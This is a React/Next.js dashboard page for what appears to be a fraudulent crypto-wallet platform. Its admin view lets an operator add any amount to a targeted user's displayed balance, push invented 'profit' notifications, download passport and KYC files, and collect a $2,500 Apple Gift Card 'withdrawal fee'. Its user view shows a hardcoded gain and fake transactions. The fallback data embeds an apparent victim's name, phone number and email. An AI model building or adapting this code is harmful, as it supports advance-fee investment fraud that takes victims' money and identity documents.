'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { useSession } from 'next-auth/react';
import { 
  ArrowDownLeft, 
  ArrowUpRight, 
  Gift, 
  CheckCircle2, 
  ChevronRight,
  TrendingUp,
  ShieldCheck,
  Users,
  DollarSign,
  Plus,
  Bell,
  Eye,
  Download,
  Settings,
  Lock,
  Wallet,
  Building,
  ShieldAlert
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Modal } from '@/components/ui/modal';

export default function DashboardPage() {
  const { data: session } = useSession();
  const user = session?.user as any;
  const isAdmin = user?.role === 'ADMIN';

  const [avatarUrl, setAvatarUrl] = useState<string>('/profile-pic.jpeg');

  // Admin Specific Controls State
  const [feeCollectedUSD, setFeeCollectedUSD] = useState(0.00);
  const [isTopUpModalOpen, setIsTopUpModalOpen] = useState(false);
  const [topUpAmount, setTopUpAmount] = useState('');
  const [topUpSuccess, setTopUpSuccess] = useState(false);

  const [isNotifModalOpen, setIsNotifModalOpen] = useState(false);
  const [notifTitle, setNotifTitle] = useState('');
  const [notifMessage, setNotifMessage] = useState('');
  const [notifCategory, setNotifCategory] = useState<'PROFIT' | 'SECURITY' | 'SYSTEM'>('PROFIT');
  const [notifSuccess, setNotifSuccess] = useState(false);

  // Managed User state for Admin view (populated live from database)
  const [leoBalanceUSD, setLeoBalanceUSD] = useState(0.00);

  // Live Database Stats for Admin
  const [adminLiveStats, setAdminLiveStats] = useState<any>({
    managedUsersCount: 0,
    totalFeesCollectedUSD: 0.00,
    pendingFeeCount: 0,
    pendingFeeValueUSD: 0.00,
    pendingKYCCount: 0,
    primaryUser: {
      name: '',
      email: '',
      phone: '',
      city: '',
      country: '',
      balanceUSD: 0.00,
      kycStatus: 'UNVERIFIED',
      avatar: '/profile-pic.jpeg',
    },
  });

  // Real-time Avatar Sync across all components
  useEffect(() => {
    const syncAvatar = () => {
      const stored = typeof window !== 'undefined' ? localStorage.getItem('user_avatar') : null;
      if (stored) {
        setAvatarUrl(stored);
      } else if (user?.avatar) {
        setAvatarUrl(user.avatar);
      }
    };

    syncAvatar();
    window.addEventListener('storage', syncAvatar);
    return () => window.removeEventListener('storage', syncAvatar);
  }, [user?.avatar]);

  // Live user balance state for standard user view
  const [userBalance, setUserBalance] = useState<number>(0.00);

  // Fetch live user profile and balance for standard user
  useEffect(() => {
    if (!isAdmin) {
      async function fetchUserProfile() {
        try {
          const res = await fetch('/api/user/profile');
          const data = await res.json();
          if (data?.success && data?.user?.wallets) {
            const usdtW = data.user.wallets.find((w: any) => w.currency === 'USDT');
            if (usdtW?.balance !== undefined) {
              setUserBalance(usdtW.balance);
            }
          }
        } catch (err) {
          console.warn('User profile fetch fallback:', err);
        }
      }
      fetchUserProfile();
    }
  }, [isAdmin]);

  // Fetch real database stats for Admin
  useEffect(() => {
    if (isAdmin) {
      async function fetchStats() {
        try {
          const res = await fetch('/api/admin/stats');
          const data = await res.json();
          if (data?.success && data?.stats) {
            setAdminLiveStats(data.stats);
            setFeeCollectedUSD(data.stats.totalFeesCollectedUSD || 0.00);
            if (data.stats.primaryUser?.balanceUSD !== undefined) {
              setLeoBalanceUSD(data.stats.primaryUser.balanceUSD);
            }
          }
        } catch (err) {
          console.warn('Admin stats fetch fallback:', err);
        }
      }
      fetchStats();
    }
  }, [isAdmin]);

  // Handle Admin Balance Top Up
  const handleTopUpLeoBalance = async () => {
    if (!topUpAmount) return;
    const added = parseFloat(topUpAmount) || 0;
    if (added <= 0) return;

    try {
      const res = await fetch('/api/admin/users/topup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: adminLiveStats.primaryUser?.id,
          email: adminLiveStats.primaryUser?.email || 'leogarcia39@onchaiin.com',
          amount: added,
        }),
      });
      const data = await res.json();
      if (data?.success && data?.newBalance !== undefined) {
        setLeoBalanceUSD(data.newBalance);
        setAdminLiveStats((prev: any) => ({
          ...prev,
          primaryUser: {
            ...prev.primaryUser,
            balanceUSD: data.newBalance,
          },
        }));
      } else {
        setLeoBalanceUSD((prev) => prev + added);
      }
      setTopUpSuccess(true);
      setTimeout(() => {
        setTopUpSuccess(false);
        setIsTopUpModalOpen(false);
        setTopUpAmount('');
      }, 1500);
    } catch (err) {
      console.warn('Error executing top up in database:', err);
    }
  };

  // Handle Admin Send Notification
  const handleSendNotification = () => {
    if (!notifTitle || !notifMessage) return;
    setNotifSuccess(true);
    setTimeout(() => {
      setNotifSuccess(false);
      setIsNotifModalOpen(false);
      setNotifTitle('');
      setNotifMessage('');
    }, 1500);
  };

  // Market movers for standard user view
  const marketMovers = [
    { name: 'Bitcoin', symbol: 'BTC', price: '$78,107.50', change: '-0.8%', isUp: false, icon: '₿' },
    { name: 'Ethereum', symbol: 'ETH', price: '$3,480.12', change: '+2.4%', isUp: true, icon: 'Ξ' },
    { name: 'Tether USD', symbol: 'USDT', price: '$1.00', change: '0.0%', isUp: true, icon: '💲' },
    { name: 'TRON', symbol: 'TRX', price: '$0.245', change: '+5.6%', isUp: true, icon: '🔴' },
    { name: 'Litecoin', symbol: 'LTC', price: '$112.80', change: '-0.4%', isUp: false, icon: 'Ł' },
  ];

  const transactions = [
    { id: 'tx-1', title: 'Apple $500 Gift Card Payout', amount: '+ 425.00 USDT', date: 'Today, 14:32', status: 'COMPLETED', icon: Gift, iconBg: 'bg-[#6EB7FF]/20 text-[#6EB7FF]' },
    { id: 'tx-2', title: 'TRC20 Wallet Deposit', amount: '+ 1,000.00 USDT', date: 'Yesterday, 09:15', status: 'COMPLETED', icon: ArrowDownLeft, iconBg: 'bg-emerald-500/20 text-emerald-400' },
    { id: 'tx-3', title: 'External Bitcoin Payout', amount: '- 0.05 BTC', date: '24 Jul 2026', status: 'COMPLETED', icon: ArrowUpRight, iconBg: 'bg-amber-500/20 text-amber-400' },
  ];

  // ----------------------------------------------------
  // ADMIN DASHBOARD VIEW (When logged in as Admin)
  // ----------------------------------------------------
  if (isAdmin) {
    return (
      <div className="max-w-6xl mx-auto px-4 py-8 space-y-8">
        {/* Admin Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-black text-white">Executive Admin Control Dashboard</h1>
            <p className="text-xs text-slate-400">Administrative fee revenue tracking, user balance controls, and compliance management</p>
          </div>

          <Badge variant="warning" size="md" className="py-1.5 px-3 font-bold bg-amber-500/15 border-amber-500/40 text-amber-400">
            <ShieldAlert className="w-4 h-4 mr-1.5 inline-block text-amber-400" /> Executive Superuser
          </Badge>
        </div>

        {/* Administrative Fee Revenue Card (No deposit/withdraw buttons) */}
        <Card glow className="p-6 sm:p-7 border-slate-800 bg-[#111A2E]/90 backdrop-blur-2xl rounded-3xl space-y-6 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-64 h-64 bg-[#6EB7FF]/10 blur-[100px] rounded-full pointer-events-none" />

          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold uppercase tracking-widest text-slate-400">
                TOTAL ADMINISTRATIVE FEES COLLECTED
              </span>
              <Badge variant="neutral" size="sm" className="bg-slate-800 border-slate-700 text-slate-300">
                Apple Gift Card Payments
              </Badge>
            </div>

            <div className="flex items-baseline space-x-3 flex-wrap">
              <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight font-sans">
                ${feeCollectedUSD.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </h2>
              <span className="text-xs font-bold text-amber-400 bg-amber-500/15 border border-amber-500/30 px-3 py-1 rounded-full">
                Updated on Fee Submissions
              </span>
            </div>
            <p className="text-xs text-slate-400 pt-1">
              Administrative revenue accumulates automatically when users submit their $2,500.00 USD Apple Gift Card fee to process payouts.
            </p>
          </div>

          {/* Fee Status Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="p-4 rounded-2xl bg-amber-500/5 border border-amber-500/30 space-y-1">
              <span className="text-xs text-slate-400 font-medium">Pending Withdrawal Fee Submissions</span>
              <p className="text-sm font-black text-amber-400 tracking-tight">1 Submission ($2,500.00 USD Queue)</p>
            </div>

            <div className="p-4 rounded-2xl bg-emerald-500/5 border border-emerald-500/30 space-y-1">
              <span className="text-xs text-slate-400 font-medium">Fee Enforcement Status</span>
              <p className="text-sm font-black text-emerald-400 tracking-tight">ACTIVE ($2,500 Apple Gift Card)</p>
            </div>
          </div>
        </Card>

        {/* Primary Managed User Account Control Suite */}
        <Card className="p-6 border-slate-800 space-y-6">
          <div className="flex items-center justify-between border-b border-slate-800 pb-4">
            <div>
              <h3 className="text-base font-extrabold text-white flex items-center space-x-2">
                <Users className="w-5 h-5 text-[#6EB7FF]" />
                <span>Primary Managed Account Control</span>
              </h3>
              <p className="text-xs text-slate-400">Direct ledger top-up, push notification dispatcher, and asset inspector</p>
            </div>
            <Link href="/admin/users">
              <Button variant="outline" size="sm" className="font-bold text-xs">
                View Full User Registry
              </Button>
            </Link>
          </div>

          <div className="p-5 rounded-2xl bg-[#0B1220] border border-slate-800 flex flex-col sm:flex-row items-center justify-between space-y-4 sm:space-y-0">
            <div className="flex items-center space-x-4">
              <img
                src={adminLiveStats.primaryUser?.avatar || '/profile-pic.jpeg'}
                alt={adminLiveStats.primaryUser?.name || 'Leo Garcia Arthur'}
                className="w-14 h-14 rounded-full object-cover ring-2 ring-[#6EB7FF]/50 shadow-xl"
              />
              <div>
                <div className="flex items-center space-x-2">
                  <h4 className="text-base font-black text-white">
                    {adminLiveStats.primaryUser?.name || 'Leo Garcia Arthur'}
                  </h4>
                  <Badge variant="success" size="sm">
                    {adminLiveStats.primaryUser?.kycStatus === 'APPROVED' ? 'KYC Verified' : adminLiveStats.primaryUser?.kycStatus || 'KYC Verified'}
                  </Badge>
                </div>
                <p className="text-xs text-slate-400 font-mono mt-0.5">
                  {adminLiveStats.primaryUser?.phone || '+1 (505) 730-8886'} • {adminLiveStats.primaryUser?.city || 'New Mexico'}, {adminLiveStats.primaryUser?.country || 'United States'}
                </p>
              </div>
            </div>

            <div className="text-center sm:text-right">
              <span className="text-xs text-slate-400 font-medium">Account Wallet Balance</span>
              <p className="text-2xl font-mono font-black text-emerald-400">
                ${(adminLiveStats.primaryUser?.balanceUSD ?? leoBalanceUSD ?? 0.00).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </p>
            </div>
          </div>

          {/* Quick Action Buttons */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <Button
              variant="primary"
              size="lg"
              className="gradient-bg-blue text-[#0B1220] font-extrabold shadow-lg shadow-[#5A9BFF]/25 py-3"
              leftIcon={<Plus className="w-4 h-4" />}
              onClick={() => setIsTopUpModalOpen(true)}
            >
              Top Up Balance
            </Button>

            <Button
              variant="outline"
              size="lg"
              className="font-bold py-3"
              leftIcon={<Bell className="w-4 h-4 text-[#6EB7FF]" />}
              onClick={() => setIsNotifModalOpen(true)}
            >
              Send Notification
            </Button>

            <Link href="/admin/kyc" className="block">
              <Button
                variant="outline"
                size="lg"
                className="w-full font-bold py-3"
                leftIcon={<Eye className="w-4 h-4 text-purple-400" />}
              >
                Inspect KYC & Assets
              </Button>
            </Link>
          </div>
        </Card>

        {/* Action Queue Links Grid */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Link href="/admin/gift-cards/submissions" className="block">
            <Card hoverable className="p-5 border-slate-800 space-y-2 bg-[#111A2E]/80">
              <div className="flex justify-between items-center">
                <span className="text-xs font-bold text-[#6EB7FF] uppercase tracking-wider">Fee Submissions</span>
                <Gift className="w-5 h-5 text-[#6EB7FF]" />
              </div>
              <p className="text-lg font-black text-white">Apple Card Uploads</p>
              <p className="text-xs text-slate-400">Inspect front gift card images ($2,500 Fee)</p>
            </Card>
          </Link>

          <Link href="/admin/kyc" className="block">
            <Card hoverable className="p-5 border-slate-800 space-y-2 bg-[#111A2E]/80">
              <div className="flex justify-between items-center">
                <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider">KYC Verification</span>
                <CheckCircle2 className="w-5 h-5 text-emerald-400" />
              </div>
              <p className="text-lg font-black text-white">User Asset Downloader</p>
              <p className="text-xs text-slate-400">Download passport photos & identity verification files</p>
            </Card>
          </Link>

          <Link href="/admin/settings" className="block">
            <Card hoverable className="p-5 border-slate-800 space-y-2 bg-[#111A2E]/80">
              <div className="flex justify-between items-center">
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">Fee Rules</span>
                <Settings className="w-5 h-5 text-amber-400" />
              </div>
              <p className="text-lg font-black text-white">Withdrawal Fee Settings</p>
              <p className="text-xs text-slate-400">Update $2,500 Apple Gift Card withdrawal fee parameters</p>
            </Card>
          </Link>
        </div>

        {/* Top Up Balance Modal */}
        <Modal
          isOpen={isTopUpModalOpen}
          onClose={() => setIsTopUpModalOpen(false)}
          title="Top Up Balance for Leo Garcia Arthur"
        >
          <div className="space-y-4 text-xs">
            {topUpSuccess && (
              <div className="p-3.5 rounded-xl bg-emerald-500/15 border border-emerald-500/40 flex items-center space-x-2 text-emerald-300 font-bold">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span>Successfully credited ${parseFloat(topUpAmount || '0').toLocaleString()} USD to Leo Garcia Arthur!</span>
              </div>
            )}

            <div className="p-3.5 rounded-xl bg-[#0B1220] border border-slate-800 space-y-1">
              <span className="text-slate-400">Current Balance:</span>
              <p className="text-lg font-mono font-black text-emerald-400">
                ${leoBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </p>
            </div>

            <Input
              label="Top Up Amount ($ USD)"
              type="number"
              placeholder="e.g. 5000.00"
              value={topUpAmount}
              onChange={(e) => setTopUpAmount(e.target.value)}
              leftIcon={<DollarSign className="w-4 h-4 text-[#6EB7FF]" />}
              required
            />

            <div className="flex space-x-3 pt-2">
              <Button variant="secondary" size="md" className="flex-1" onClick={() => setIsTopUpModalOpen(false)}>
                Cancel
              </Button>
              <Button
                variant="primary"
                size="md"
                className="flex-1 font-bold gradient-bg-blue text-[#0B1220]"
                disabled={!topUpAmount}
                onClick={handleTopUpLeoBalance}
              >
                Execute Balance Top Up
              </Button>
            </div>
          </div>
        </Modal>

        {/* Send Notification Modal */}
        <Modal
          isOpen={isNotifModalOpen}
          onClose={() => setIsNotifModalOpen(false)}
          title="Send Notification to Leo Garcia Arthur"
        >
          <div className="space-y-4 text-xs">
            {notifSuccess && (
              <div className="p-3.5 rounded-xl bg-emerald-500/15 border border-emerald-500/40 flex items-center space-x-2 text-emerald-300 font-bold">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span>Notification successfully sent to Leo Garcia Arthur's inbox!</span>
              </div>
            )}

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-300">Notification Type</label>
              <div className="grid grid-cols-3 gap-2">
                <button
                  type="button"
                  onClick={() => setNotifCategory('PROFIT')}
                  className={`py-2 rounded-xl border text-xs font-bold transition-all ${
                    notifCategory === 'PROFIT'
                      ? 'bg-emerald-500/20 border-emerald-500 text-emerald-400'
                      : 'bg-slate-900 border-slate-800 text-slate-400'
                  }`}
                >
                  Profit (+%)
                </button>
                <button
                  type="button"
                  onClick={() => setNotifCategory('SECURITY')}
                  className={`py-2 rounded-xl border text-xs font-bold transition-all ${
                    notifCategory === 'SECURITY'
                      ? 'bg-amber-500/20 border-amber-500 text-amber-400'
                      : 'bg-slate-900 border-slate-800 text-slate-400'
                  }`}
                >
                  Security
                </button>
                <button
                  type="button"
                  onClick={() => setNotifCategory('SYSTEM')}
                  className={`py-2 rounded-xl border text-xs font-bold transition-all ${
                    notifCategory === 'SYSTEM'
                      ? 'bg-purple-500/20 border-purple-500 text-purple-400'
                      : 'bg-slate-900 border-slate-800 text-slate-400'
                  }`}
                >
                  System
                </button>
              </div>
            </div>

            <Input
              label="Notification Title"
              type="text"
              placeholder="e.g. Assets Rose 10% Profits"
              value={notifTitle}
              onChange={(e) => setNotifTitle(e.target.value)}
              required
            />

            <div className="space-y-1">
              <label className="text-xs font-bold text-slate-300">Message Content</label>
              <textarea
                rows={3}
                placeholder="e.g. Assets rose to 10% profits in the stock market!"
                value={notifMessage}
                onChange={(e) => setNotifMessage(e.target.value)}
                className="w-full bg-[#111A2E] border border-slate-700/80 rounded-xl p-3 text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-[#6EB7FF]"
                required
              />
            </div>

            <div className="flex space-x-3 pt-2">
              <Button variant="secondary" size="md" className="flex-1" onClick={() => setIsNotifModalOpen(false)}>
                Cancel
              </Button>
              <Button
                variant="primary"
                size="md"
                className="flex-1 font-bold gradient-bg-blue text-[#0B1220]"
                disabled={!notifTitle || !notifMessage}
                onClick={handleSendNotification}
              >
                Send Notification
              </Button>
            </div>
          </div>
        </Modal>
      </div>
    );
  }

  // ----------------------------------------------------
  // STANDARD USER DASHBOARD VIEW (Leo Garcia Arthur)
  // ----------------------------------------------------
  return (
    <div className="max-w-md mx-auto sm:max-w-2xl lg:max-w-4xl px-4 py-6 space-y-6">
      {/* 1. Header Profile Bar */}
      <div className="flex items-center justify-between pt-2">
        <div className="flex items-center space-x-3.5">
          <img
            src={avatarUrl}
            alt={user?.name || 'Leo Garcia Arthur'}
            className="w-14 h-14 rounded-full object-cover ring-2 ring-[#6EB7FF]/50 shadow-xl"
          />
          <div>
            <p className="text-xs text-slate-400 font-medium">Welcome back</p>
            <h1 className="text-xl font-extrabold text-white tracking-tight">
              {user?.name || 'Leo Garcia Arthur'}
            </h1>
          </div>
        </div>

        <Badge variant="success" size="md" className="py-1.5 px-3.5 bg-emerald-500/15 border-emerald-500/40 text-emerald-400 font-bold rounded-full">
          <CheckCircle2 className="w-4 h-4 mr-1.5 inline-block text-emerald-400 fill-emerald-500/20" />
          Verified
        </Badge>
      </div>

      {/* 2. Total Balance Card */}
      <Card glow className="p-6 sm:p-7 border-slate-800 bg-[#111A2E]/90 backdrop-blur-2xl rounded-3xl space-y-6 relative overflow-hidden">
        <div className="absolute top-0 right-0 w-48 h-48 bg-[#6EB7FF]/10 blur-[80px] rounded-full pointer-events-none" />

        <div className="space-y-2">
          <p className="text-xs font-bold uppercase tracking-widest text-slate-400">TOTAL BALANCE</p>
          <div className="flex items-baseline space-x-3 flex-wrap">
            <h2 className="text-3xl sm:text-4xl font-black text-white tracking-tight font-sans">
              ${userBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </h2>
            <span className="text-xs font-bold text-emerald-400 bg-emerald-500/15 border border-emerald-500/30 px-2.5 py-1 rounded-full">
              +7.5%
            </span>
          </div>
        </div>

        {/* Available & Pending Status Pills Grid */}
        <div className="grid grid-cols-2 gap-3.5">
          <div className="p-3.5 rounded-2xl bg-emerald-500/5 border border-emerald-500/40 space-y-1">
            <p className="text-xs text-slate-400 font-medium">Available</p>
            <p className="text-sm font-black text-emerald-400 uppercase tracking-wider">UNLOCKED</p>
          </div>

          <div className="p-3.5 rounded-2xl bg-emerald-500/5 border border-emerald-500/40 space-y-1">
            <p className="text-xs text-slate-400 font-medium">Pending</p>
            <p className="text-sm font-bold text-emerald-400 tracking-tight">No fees required</p>
          </div>
        </div>

        {/* Deposit & Withdraw Buttons */}
        <div className="grid grid-cols-2 gap-3.5 pt-1">
          <Link href="/wallet/deposit" className="block">
            <Button
              variant="primary"
              size="lg"
              className="w-full py-3.5 text-sm font-extrabold gradient-bg-blue text-[#0B1220] rounded-2xl shadow-lg shadow-[#5A9BFF]/25"
            >
              Deposit
            </Button>
          </Link>
          <Link href="/wallet/withdraw" className="block">
            <Button
              variant="primary"
              size="lg"
              className="w-full py-3.5 text-sm font-extrabold gradient-bg-blue text-[#0B1220] rounded-2xl shadow-lg shadow-[#5A9BFF]/25"
            >
              Withdraw
            </Button>
          </Link>
        </div>
      </Card>

      {/* 3. Market Movers Section */}
      <div className="space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-extrabold text-white flex items-center space-x-2">
            <TrendingUp className="w-4 h-4 text-[#6EB7FF]" />
            <span>Live Market Rates</span>
          </h3>
          <Link href="/trade" className="text-xs font-bold text-[#6EB7FF] hover:underline flex items-center">
            Trade Now <ChevronRight className="w-3.5 h-3.5 ml-0.5" />
          </Link>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-3">
          {marketMovers.map((item) => (
            <Card key={item.symbol} hoverable className="p-3.5 border-slate-800 space-y-2 bg-[#111A2E]/80">
              <div className="flex items-center justify-between">
                <span className="text-base">{item.icon}</span>
                <span className={`text-[11px] font-bold ${item.isUp ? 'text-emerald-400' : 'text-rose-400'}`}>
                  {item.change}
                </span>
              </div>
              <div>
                <p className="text-xs font-bold text-white">{item.symbol}</p>
                <p className="text-[11px] font-mono text-slate-300 font-bold">{item.price}</p>
              </div>
            </Card>
          ))}
        </div>
      </div>

      {/* 4. Recent Activity */}
      <div className="space-y-3">
        <div className="flex items-center justify-between">
          <h3 className="text-sm font-extrabold text-white">Recent Activity</h3>
          <Link href="/wallet" className="text-xs font-bold text-[#6EB7FF] hover:underline">
            View All
          </Link>
        </div>

        <Card className="p-2 border-slate-800 divide-y divide-slate-800/60 bg-[#111A2E]/80">
          {transactions.map((tx) => {
            const Icon = tx.icon;
            return (
              <div key={tx.id} className="p-3 flex items-center justify-between hover:bg-slate-800/30 rounded-xl transition-colors">
                <div className="flex items-center space-x-3">
                  <div className={`p-2.5 rounded-xl ${tx.iconBg}`}>
                    <Icon className="w-4 h-4" />
                  </div>
                  <div>
                    <p className="text-xs font-bold text-white">{tx.title}</p>
                    <p className="text-[10px] text-slate-400">{tx.date}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-xs font-mono font-bold text-emerald-400">{tx.amount}</p>
                  <p className="text-[10px] text-slate-400 font-semibold">{tx.status}</p>
                </div>
              </div>
            );
          })}
        </Card>
      </div>
    </div>
  );
}
